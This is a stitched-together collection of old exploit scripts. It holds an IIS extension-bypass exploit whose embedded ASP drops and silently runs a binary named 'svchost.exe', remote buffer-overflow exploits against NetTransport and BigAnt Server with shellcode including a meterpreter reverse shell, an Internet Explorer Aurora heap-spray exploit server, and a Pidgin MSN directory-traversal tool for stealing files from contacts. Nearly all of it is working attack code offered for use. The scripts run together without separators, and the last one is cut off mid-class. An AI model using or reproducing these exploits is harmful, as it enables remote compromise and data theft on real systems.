ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(128)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(48)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(9)&Chr(4)&Chr(0)&Chr(0)&Chr(72)&Chr(0)&Chr(0)&Chr(0)&Chr(88)&Chr(192)&Chr(0)&Chr(0)&Chr(90)&Chr(1)&Chr(0)&Chr(0)&Chr(228)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(60)&Chr(97)&Chr(115)&Chr(115)&Chr(101)&Chr(109)&Chr(98)&Chr(108)&Chr(121)&Chr(32)&Chr(120)&Chr(109)&Chr(108)&Chr(110)&Chr(115)&Chr(61)&Chr(34)&Chr(117)&Chr(114)&Chr(110)&Chr(58)&Chr(115)&Chr(99)&Chr(104)&Chr(101)&Chr(109)&Chr(97)&Chr(115)&Chr(45)&Chr(109)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)
ySXd=ySXd&Chr(102)&Chr(116)&Chr(45)&Chr(99)&Chr(111)&Chr(109)&Chr(58)&Chr(97)&Chr(115)&Chr(109)&Chr(46)&Chr(118)&Chr(49)&Chr(34)&Chr(32)&Chr(109)&Chr(97)&Chr(110)&Chr(105)&Chr(102)&Chr(101)&Chr(115)&Chr(116)&Chr(86)&Chr(101)&Chr(114)&Chr(115)&Chr(105)&Chr(111)&Chr(110)&Chr(61)&Chr(34)&Chr(49)&Chr(46)&Chr(48)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(60)&Chr(116)&Chr(114)&Chr(117)&Chr(115)&Chr(116)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(32)&Chr(120)&Chr(109)&Chr(108)&Chr(110)&Chr(115)&Chr(61)&Chr(34)&Chr(117)&Chr(114)&Chr(110)&Chr(58)&Chr(115)&Chr(99)&Chr(104)&Chr(101)&Chr(109)&Chr(97)&Chr(115)&Chr(45)&Chr(109)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(45)&Chr(99)&Chr(111)&Chr(109)&Chr(58)&Chr(97)&Chr(115)&Chr(109)&Chr(46)&Chr(118)&Chr(51)&Chr(34)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)
ySXd=ySXd&Chr(115)&Chr(101)&Chr(99)&Chr(117)&Chr(114)&Chr(105)&Chr(116)&Chr(121)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(105)&Chr(108)&Chr(101)&Chr(103)&Chr(101)&Chr(115)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(76)&Chr(101)&Chr(118)&Chr(101)&Chr(108)&Chr(32)&Chr(108)&Chr(101)&Chr(118)&Chr(101)&Chr(108)&Chr(61)&Chr(34)&Chr(97)&Chr(115)&Chr(73)&Chr(110)&Chr(118)&Chr(111)&Chr(107)&Chr(101)&Chr(114)&Chr(34)&Chr(32)&Chr(117)&Chr(105)&Chr(65)&Chr(99)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(61)
ySXd=ySXd&Chr(34)&Chr(102)&Chr(97)&Chr(108)&Chr(115)&Chr(101)&Chr(34)&Chr(62)&Chr(60)&Chr(47)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(117)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(76)&Chr(101)&Chr(118)&Chr(101)&Chr(108)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(47)&Chr(114)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(101)&Chr(100)&Chr(80)&Chr(114)&Chr(105)&Chr(118)&Chr(105)&Chr(108)&Chr(101)&Chr(103)&Chr(101)&Chr(115)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(60)&Chr(47)&Chr(115)&Chr(101)&Chr(99)&Chr(117)&Chr(114)&Chr(105)&Chr(116)&Chr(121)&Chr(62)&Chr(13)&Chr(10)&Chr(32)&Chr(32)&Chr(60)&Chr(47)&Chr(116)&Chr(114)&Chr(117)&Chr(115)&Chr(116)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(62)&Chr(13)&Chr(10)&Chr(60)
ySXd=ySXd&Chr(47)&Chr(97)&Chr(115)&Chr(115)&Chr(101)&Chr(109)&Chr(98)&Chr(108)&Chr(121)&Chr(62)&Chr(80)&Chr(65)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(80)&Chr(65)&Chr(68)&Chr(68)&Chr(73)&Chr(78)&Chr(71)&Chr(88)&Chr(88)&Chr(80)&Chr(65)&Chr(68)
Dim KHCfThDGebhDR
Set KHCfThDGebhDR = CreateObject("Scripting.FileSystemObject")
Dim qKZSppkwYyBIX
Dim XXxOLreL
Dim MPUuLLtGhWsseqS
Dim ppWzYNxO
Set XXxOLreL = KHCfThDGebhDR.GetSpecialFolder(2)
ppWzYNxO = XXxOLreL & "\\" & KHCfThDGebhDR.GetTempName()
KHCfThDGebhDR.CreateFolder(ppWzYNxO)
MPUuLLtGhWsseqS = ppWzYNxO & "\\" & "svchost.exe"
Set qKZSppkwYyBIX = KHCfThDGebhDR.CreateTextFile(MPUuLLtGhWsseqS,2,0)
qKZSppkwYyBIX.Write ySXd
qKZSppkwYyBIX.Close
Dim vOQlhfUvmCovHX
Set vOQlhfUvmCovHX = CreateObject("Wscript.Shell")
vOQlhfUvmCovHX.run MPUuLLtGhWsseqS, 0, false
End Sub
vhlORMNVu
%>
"""

# output file
output_filename = "evil.asp;.jpg"

# banner
print "Exploit for Microsoft IIS ASP Multiple Extensions Security Bypass 5.x/6.x"
print "By Emanuele Gentili and Emanuele Acri (http://backtrack.it)"
print ""

# check arguments
if len(sys.argv) < 3:
	print "usage:"
	print "\t" + sys.argv[0] + " <image.jpg> <shellcode number>"
	print "shellcodes:"
	print "\t0 - shell_bind_tcp"
	print "\t1 - meterpreter_bind_tcp"
	print "\t2 - vncinject_bind_tcp"
	exit(1)

# get arguments
filename         = sys.argv[1]
shellcode_number = int(sys.argv[2])

if shellcode_number == 0:
	shellcode = shell_bind_tcp
elif shellcode_number == 1:
	shellcode = meterpreter_bind_tcp
elif shellcode_number == 2:
	shellcode = vncinject_bind_tcp
else:
	print "[-] wrong shellcode number :("
	exit(1)

# create file

image_file = open(filename, "r")
image_raw = image_file.readlines()
image_file.close()

output = open(output_filename, "w")
output.writelines(image_raw)
output.writelines(shellcode)
output.close()

print "[+] File " + output_filename + " created and ready to use."
print "Enjoy... ;)"

#!/usr/bin/python

#########################
#NetTransport Download Manager version:2.90.510 0day
#Discovered by Lincoln
#Tested on Windows XP SP3
#
#eMule file sharing protocol
#SEH overwrite, leaves only 60 or so bytes after p/p/r
#egghunter is used to find sc (calc.exe)
#
#root@BT4VM:~# ./netxfer.py 192.168.1.8 31491
#########################

import socket,sys

host = sys.argv[1]
port = int(sys.argv[2]) #eD2K port

# * windows/exec - 200 bytes
# * http://www.metasploit.com
# * EXITFUNC=thread, CMD=calc.exe
sc = ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x6a\x01\x8d\x85\xb9\x00"
"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a"
"\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"
"\x2e\x65\x78\x65\x00")

#magic packet
buf = ("\xe3\x3d\x00\x00\x00\x01\xee\x4f\x08\xe3\x00\x0e\xae\x41\xb0\x24"
"\x89\x38\x1c\xc7\x6f\x6e\x00\x00\x00\x00\xaf\x8d\x04\x00\x00\x00"
"\x02\x01\x00\x01\x04\x00\x74\x65\x73\x74\x03\x01\x00\x11\x3c\x00")

#egg =  c00lc00l
egghunter = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
"\x63\x30\x30\x6c\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

#p/p/r 10002a57 libssl.dll
buf+= "\x41" * 119 + "\xeb\x06\x90\x90" + "\x57\x2a\x00\x10" + "\x90" * 10 + egghunter
buf+= "\x90" * 50 + "c00lc00l" + "\x90" * 20 + sc + "\x90" * 2000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buf)
print "\nExploit Sent!! Give the egghunter a few seconds to find the shellcode\r\n"
s.close()#!/usr/bin/python

#BigAnt Server 2.52 remote buffer overflow exploit 2
#Author: DouBle_Zer0
#Vulnerability discovered by Lincoln
#a another version of the original exploit (by Lincoln)
#application is little hazy..

import sys,socket

host = sys.argv[1]
buffer= "\x90" * 20

#./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.3 R | ./msfencode -e x86/alpha_mixed -t c
#size 643 byte
buffer+= ("\x89\xe1\xd9\xce\xd9\x71\xf4\x59\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x49"
"\x6c\x49\x78\x4c\x49\x47\x70\x43\x30\x47\x70\x45\x30\x4f\x79"
"\x4a\x45\x50\x31\x49\x42\x45\x34\x4e\x6b\x42\x72\x50\x30\x4e"
"\x6b\x50\x52\x44\x4c\x4c\x4b\x51\x42\x47\x64\x4e\x6b\x51\x62"
"\x44\x68\x46\x6f\x4d\x67\x50\x4a\x51\x36\x45\x61\x4b\x4f\x44"
"\x71\x49\x50\x4c\x6c\x45\x6c\x50\x61\x43\x4c\x44\x42\x46\x4c"
"\x51\x30\x4a\x61\x4a\x6f\x44\x4d\x46\x61\x4a\x67\x4b\x52\x4a"
"\x50\x42\x72\x50\x57\x4c\x4b\x42\x72\x44\x50\x4e\x6b\x42\x62"
"\x45\x6c\x47\x71\x48\x50\x4c\x4b\x51\x50\x42\x58\x4b\x35\x49"
"\x50\x50\x74\x50\x4a\x47\x71\x48\x50\x50\x50\x4c\x4b\x43\x78"
"\x46\x78\x4e\x6b\x51\x48\x47\x50\x43\x31\x49\x43\x49\x73\x47"
"\x4c\x51\x59\x4c\x4b\x45\x64\x4c\x4b\x43\x31\x4b\x66\x44\x71"
"\x49\x6f\x50\x31\x4f\x30\x4e\x4c\x49\x51\x48\x4f\x46\x6d\x43"
"\x31\x4a\x67\x44\x78\x49\x70\x51\x65\x4a\x54\x45\x53\x51\x6d"
"\x4a\x58\x45\x6b\x43\x4d\x51\x34\x43\x45\x48\x62\x43\x68\x4e"
"\x6b\x46\x38\x51\x34\x43\x31\x4b\x63\x45\x36\x4e\x6b\x44\x4c"
"\x50\x4b\x4c\x4b\x43\x68\x47\x6c\x46\x61\x4e\x33\x4c\x4b\x44"
"\x44\x4c\x4b\x47\x71\x4a\x70\x4c\x49\x43\x74\x51\x34\x51\x34"
"\x43\x6b\x51\x4b\x50\x61\x42\x79\x51\x4a\x46\x31\x4b\x4f\x49"
"\x70\x46\x38\x43\x6f\x51\x4a\x4e\x6b\x42\x32\x48\x6b\x4d\x56"
"\x43\x6d\x50\x68\x46\x53\x46\x52\x45\x50\x43\x30\x43\x58\x43"
"\x47\x50\x73\x50\x32\x43\x6f\x42\x74\x45\x38\x50\x4c\x43\x47"
"\x46\x46\x47\x77\x49\x6f\x4b\x65\x4c\x78\x4e\x70\x45\x51\x47"
"\x70\x47\x70\x45\x79\x48\x44\x43\x64\x42\x70\x42\x48\x44\x69"
"\x4b\x30\x42\x4b\x47\x70\x4b\x4f\x48\x55\x50\x50\x46\x30\x46"
"\x30\x46\x30\x43\x70\x50\x50\x47\x30\x46\x30\x43\x58\x4a\x4a"
"\x44\x4f\x49\x4f\x49\x70\x4b\x4f\x4b\x65\x4a\x37\x50\x6a\x44"
"\x45\x43\x58\x4f\x30\x4e\x48\x47\x71\x44\x43\x45\x38\x45\x52"
"\x43\x30\x44\x51\x43\x6c\x4e\x69\x49\x76\x50\x6a\x42\x30\x50"
"\x56\x46\x37\x50\x68\x4a\x39\x4d\x75\x44\x34\x50\x61\x4b\x4f"
"\x4b\x65\x4f\x75\x4b\x70\x42\x54\x44\x4c\x4b\x4f\x42\x6e\x47"
"\x78\x44\x35\x4a\x4c\x43\x58\x4a\x50\x48\x35\x4d\x72\x43\x66"
"\x4b\x4f\x4a\x75\x50\x6a\x47\x70\x43\x5a\x45\x54\x46\x36\x43"
"\x67\x42\x48\x44\x42\x49\x49\x4f\x38\x51\x4f\x4b\x4f\x4b\x65"
"\x4e\x6b\x47\x46\x50\x6a\x51\x50\x42\x48\x45\x50\x42\x30\x43"
"\x30\x45\x50\x50\x56\x42\x4a\x45\x50\x42\x48\x51\x48\x4c\x64"
"\x46\x33\x4a\x45\x49\x6f\x4e\x35\x4a\x33\x43\x63\x42\x4a\x45"
"\x50\x46\x36\x43\x63\x50\x57\x50\x68\x44\x42\x48\x59\x4f\x38"
"\x43\x6f\x4b\x4f\x4e\x35\x43\x31\x48\x43\x51\x39\x4f\x36\x4c"
"\x45\x49\x66\x43\x45\x48\x6c\x4b\x73\x44\x4a\x41\x41")
buffer+= "\x90" * 294
buffer+= "\xe9\x4c\xfc\xff\xff"  #near jmp -----> shellcode
buffer+= "\xeb\xf9\x90\x90"      #short jmp ----> near jmp
buffer+= "\x95\x32\x9a\x0f"      #p/p/r(partial overwrite is not possible as far as i know) 
buffer+= "\x41" * 1000           #play
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,6660))
s.send("USV " + buffer + "\r\n\r\n")
s.close()
#
#   Author : Ahmed Obied (ahmed.obied@gmail.com)
#
#   This program acts as a web server that generates an exploit to 
#   target a vulnerability (CVE-2010-0249) in Internet Explorer. 
#   The exploit was tested using Internet Explorer 6 on Windows XP SP2. 
#   The exploit's payload spawns the calculator. 
#
#   Usage  : python ie_aurora.py [port number]
#   
 
import sys
import socket

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
        
class RequestHandler(BaseHTTPRequestHandler):

    def convert_to_utf16(self, payload):
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += '%%u%04x' % num
        return enc_payload
                
    def get_payload(self):
        # win32_exec - EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub
        # http://metasploit.com
        payload  = '\x31\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73'
        payload += '\x13\x6f\x02\xb1\x0e\x83\xeb\xfc\xe2\xf4\x93\xea\xf5\x0e'
        payload += '\x6f\x02\x3a\x4b\x53\x89\xcd\x0b\x17\x03\x5e\x85\x20\x1a'
        payload += '\x3a\x51\x4f\x03\x5a\x47\xe4\x36\x3a\x0f\x81\x33\x71\x97'
        payload += '\xc3\x86\x71\x7a\x68\xc3\x7b\x03\x6e\xc0\x5a\xfa\x54\x56'
        payload += '\x95\x0a\x1a\xe7\x3a\x51\x4b\x03\x5a\x68\xe4\x0e\xfa\x85'
        payload += '\x30\x1e\xb0\xe5\xe4\x1e\x3a\x0f\x84\x8b\xed\x2a\x6b\xc1'
        payload += '\x80\xce\x0b\x89\xf1\x3e\xea\xc2\xc9\x02\xe4\x42\xbd\x85'
        payload += '\x1f\x1e\x1c\x85\x07\x0a\x5a\x07\xe4\x82\x01\x0e\x6f\x02'
        payload += '\x3a\x66\x53\x5d\x80\xf8\x0f\x54\x38\xf6\xec\xc2\xca\x5e'
        payload += '\x07\x7c\x69\xec\x1c\x6a\x29\xf0\xe5\x0c\xe6\xf1\x88\x61'
        payload += '\xd0\x62\x0c\x2c\xd4\x76\x0a\x02\xb1\x0e'
        return self.convert_to_utf16(payload)
    
    def get_exploit(self):
        exploit = '''
        <html>
        <head>
            <script>
            
            var obj, event_obj;
            
            function spray_heap()
            {
                var chunk_size, payload, nopsled;
            
                chunk_size = 0x80000;
                payload = unescape("<PAYLOAD>");
                nopsled = unescape("<NOP>");
                while (nopsled.length < chunk_size)
                    nopsled += nopsled;
                nopsled_len = chunk_size - (payload.length + 20);        
                nopsled = nopsled.substring(0, nopsled_len);
                heap_chunks = new Array();
                for (var i = 0 ; i < 200 ; i++)
                    heap_chunks[i] = nopsled + payload;
            }
        
            function initialize()
            {
                obj = new Array();
                event_obj = null;
                for (var i = 0; i < 200 ; i++ )
                    obj[i] = document.createElement("COMMENT");
            }
        
            function ev1(evt)
            {
                event_obj = document.createEventObject(evt);
                document.getElementById("sp1").innerHTML = "";
                window.setInterval(ev2, 1);
            }
      
            function ev2()
            {
                var data, tmp;
                
                data = "";
                tmp = unescape("%u0a0a%u0a0a");
                for (var i = 0 ; i < 4 ; i++)
                    data += tmp;
                for (i = 0 ; i < obj.length ; i++ ) {
                    obj[i].data = data;
                }
                event_obj.srcElement;
            }
                    
            function check()
            {
                if (navigator.userAgent.indexOf("MSIE") == -1)
                    return false;
                return true;   
            }
            
            if (check()) {
                initialize();
                spray_heap();               
            }
            else
                window.location = 'about:blank'
                
            </script>
        </head>
        <body>
            <span id="sp1">
            <img src="aurora.gif" onload="ev1(event)">
            </span>        
        </body>
        </html>
        '''
        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
        exploit = exploit.replace('<NOP>', '%u0a0a%u0a0a')
        return exploit 

    def get_image(self):
        content  = '\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
        content += '\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44'
        content += '\x01\x00\x3b'
        return content

    def log_request(self, *args, **kwargs):
        pass
        
    def do_GET(self):
        try:
            if self.path == '/':
                print
                print '[-] Incoming connection from %s' % self.client_address[0]
                self.send_response(200) 
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                print '[-] Sending exploit to %s ...' % self.client_address[0]
                self.wfile.write(self.get_exploit())
                print '[-] Exploit sent to %s' % self.client_address[0]
            elif self.path == '/aurora.gif':      
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.end_headers()
                self.wfile.write(self.get_image())
        except: 
            print '[*] Error : an error has occured while serving the HTTP request'
            print '[-] Exiting ...'
            sys.exit(-1)
            
                       
def main():
    if len(sys.argv) != 2:
        print 'Usage: %s [port number (between 1024 and 65535)]' % sys.argv[0]
        sys.exit(0)
    try:
        port = int(sys.argv[1])
        if port < 1024 or port > 65535:
            raise ValueError
        try:
            serv = HTTPServer(('', port), RequestHandler)
            ip = socket.gethostbyname(socket.gethostname())
            print '[-] Web server is running at http://%s:%d/' % (ip, port)
            try:
                serv.serve_forever()
            except:
                print '[-] Exiting ...' 
        except socket.error:
            print '[*] Error : a socket error has occurred'
        sys.exit(-1)    
    except ValueError:
        print '[*] Error : an invalid port number was given'
        sys.exit(-1)
            
if __name__ == '__main__':
    main()
#!/usr/bin/env python 
"""
Pidgin MSN <= 2.6.4 file download vulnerability

19 January 2010

Mathieu GASPARD (gaspmat@gmail.com)


Description:
		Pidgin is a multi-protocol Instant Messenger.

		This is an exploit for the vulnerability[1] discovered in Pidgin by Fabian Yamaguchi.
		The issue is caused by an error in the MSN custom smiley feature when processing emoticon requests, 
		which could allow attackers to disclose the contents of arbitrary files via directory traversal attacks.

Affected versions :
		Pidgin <= 2.6.4, Adium and other IM using Pidgin-libpurple/libmsn library.
		Plugin msn-pecan 0.1.0-rc2  (http://code.google.com/p/msn-pecan/) IS also vulnerable even if Pidgin is up to date

Plateforms :
		Windows, Linux, Mac

Fix :
		Fixed in Pidgin 2.6.5
		Update to the latest version : http://www.pidgin.im/download/

References :
		[1] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0013
		[2] http://www.pidgin.im/news/security/?id=42

Usage :
		You need the Python MSN Messenger library : http://telepathy.freedesktop.org/wiki/Pymsn
		python pidgin_exploit.py -a YOUR_MSN_EMAIL -c TARGET_MSN_EMAIL -f FILE [-o OUTPUT_FILE] [-l]

Example : 
# python pidgin_exploit.py -a foo@hotmail.com -c victim@hotmail.com -f ../accounts.xml [-o accounts.xml]

		***********************************************************

		Pidgin MSN file download vulnerability (CVE-2010-0013)

		Usage: %prog -a YOUR_MSN_EMAIL -c TARGET_MSN_EMAIL -f FILE_REQUESTED [-o DESTINATION_FILE] [-l]

		***********************************************************

		Please enter the password for the account "foo@hotmail.com"
		Password:
		[+] Connecting to server
		[+] Authentication in progress
		[+] Synchronisation in progress
		[+] OK, all done, ready to proceed
		[+] Sending request for file "../accounts.xml" to "victim@hotmail.com"
		[+] Using session_id 974948028
		Current : 3606, total: 3881  (92%)
		[+] Got an answer from the contact
		----------------
		<?xml version='1.0' encoding='UTF-8' ?>

		<account version='1.0'>
		........
"""


import warnings
warnings.simplefilter("ignore",DeprecationWarning)
import os
import sys
try:
	import pymsn
except ImportError:
	print "Pymsn couldn't be loaded"
	print "On debian-like systems, the package is python-msn"
	sys.exit(-1)
import gobject
import logging
import getpass
import hashlib
from optparse import OptionParser
import signal
import time

SERVER_ADDRESS = 'messenger.hotmail.com'
SERVER_PORT = 1863
FD_OUT = sys.stdout
MAINLOOP = None
# seconds after which, if we didn't get an answer, we quit
TIMEOUT = 5

global_client = None

def quit():
	MAINLOOP.quit()
	sys.exit(0)
	

def check_if_succeeds():
	# if False, we didn't get a chunk so we won't get any file, so we quit
	if global_client.GOT_CONTROL_BLOB == False:
		print "[+] Didn't get an answer from the client after %d seconds, it's likely not vulnerable or the file requested doesn't exist/is not accessible"%TIMEOUT
		print "[+] Exiting"
		global_client.quit()

# called when we get the result data, after our request
def handle_answer(object, client):
	print "\n[+] Got an answer from the contact"
	d = object._data
	data = d.read()
	length = len(data)
	FD_OUT.write(data)
	# if we wrote output to stdout, don't close it
	if FD_OUT != sys.stdout:
		FD_OUT.close()
		print "[+] Wrote %d bytes to file"%length
	client.end = time.time()
	duration = client.end - client.begin
	print "[+] Download lasted %d seconds at %d bytes/s "%(duration,(length/duration))
	client.quit()

def my_on_chunk_recv(transport, chunk):
	global_client._p2p_session_manager._transport_manager._on_chunk_received_OLD(transport, chunk)
	session_id = chunk.header.session_id
	blob_id = chunk.header.blob_id
	if session_id == global_client.session_id:
		# first blob is control, we "squeeze" it and keep only the second one
		if global_client.GOT_CONTROL_BLOB == False:
			#print "Got Control blob in our connection (session_id : %d, blob_id: %d)"%(session_id, blob_id)
			global_client.GOT_CONTROL_BLOB = True
		else:
			# if connections is complete, session_id is removed from data_blobs so we have to check before accessing it
			if global_client._p2p_session_manager._transport_manager._data_blobs.has_key(session_id):
				current_blob = global_client._p2p_session_manager._transport_manager._data_blobs[session_id]
				print "Current : %d, total: %d  (%d%%)\r"%(current_blob.current_size, current_blob.total_size, ((current_blob.current_size*100)/current_blob.total_size)),
				sys.stdout.flush()


def error_handler(self, error_type, error):
	# __on_user_invitation_failed, probably because contact is offline/invisible
	if error_type == pymsn.event.ConversationErrorType.CONTACT_INVITE and \
	error == pymsn.event.ContactInviteError.NOT_AVAILABLE:
		print "[*] ERROR, contact didn't accept our invite, probably because it is disconnected/invisible"
		quit()
	# __on_message_undelivered, probably because contact is offline/invisible
	if error_type ==  pymsn.event.ConversationErrorType.MESSAGE and \
	error ==  pymsn.event.MessageError.DELIVERY_FAILED:
		print "[*] ERROR, couldn't send message, probably because contact is disconnected/invisible"
		quit()
	print "[*] Unhandled error, error_type : %d , error : %d"%(error_type, error)
	quit()
	
class MyClient(pymsn.Client):
	def __init__(self, server, quit, victim, filename, list_only, proxies={}, transport_class=pymsn.transport.DirectConnection):
		# callback to quit
		self.quit = quit
		# victim from whom we request the file
		self.victim = victim
		# just list contacts for this account
		self.list_only = list_only
		# file we request
		self.filename = filename
		# to calculate download duration and speed
		self.begin = 0
		self.end = 0
		# session_id of the connection to retrieve the file
		self.session_id = 0
		# have we already seen the "control blob" for this connection
		self.GOT_CONTROL_BLOB = False
		pymsn.Client.__init__(self, server)
		# REALLY REALLY HACKISH
		# if contact is disconnected/invisible, a "NotImplementedError" exception is raised
		# and it can't be caught AFAIK so it needs to be redefined here
		# handler_class should be SwitchboardClient
		for handler_class, extra_args in self._switchboard_manager._handlers_class:
			handler_class._on_error = error_handler



class MyMSNObjectStore(pymsn.p2p.MSNObjectStore):
	def __compute_data_hash(self, data):
		digest = hashlib.sha1()
		data.seek(0, 0)
		read_data = data.read(1024)
		while len(read_data) > 0:
			digest.update(read_data)
			read_data = data.read(1024)
		data.seek(0, 0)
		return digest.digest()

	# need to compute the SHA hash (SHAd in MSNObject) otherelse the function in MSNObjectStore complains because
	# the hash of the data we receive is not the hash we expected (hash we expect is the one we send, which is always the same here)
	def _outgoing_session_transfer_completed(self, session, data):
		handle_id, callback, errback, msn_object = self._outgoing_sessions[session]    
		msn_object._data_sha = self.__compute_data_hash(data)    	  
